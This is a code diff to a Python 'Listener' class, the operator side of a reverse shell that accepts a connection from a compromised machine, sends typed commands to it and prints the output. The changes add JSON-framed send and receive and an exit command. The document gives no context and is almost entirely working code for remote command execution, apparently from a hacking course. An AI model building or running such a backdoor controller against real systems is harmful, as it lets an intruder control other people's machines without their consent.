@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import socket
 import subprocess
+import json
 
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True)
@@ -15,16 +16,33 @@ class Listener:
         self.connection, address = listener.accept()
         print("\n[+] Connection accepted\n" + str(address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode('utf-8'))
+
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data.decode())
+            except ValueError:
+                continue
+
     def execute_remotely(self, command):
-        self.connection.send(command.encode())
-        return self.connection.recv(1024)
+        self.reliable_send(command)
+        if command[0] == 'exit':
+            self.connection.close()
+            exit()
+        return self.reliable_receive()
 
 
     def run(self):
         while True:
             command = input(">>")
+            command = command.split(" ")
             result = self.execute_remotely(command)
-            print(result.decode())
+            print(result)
 
 
 
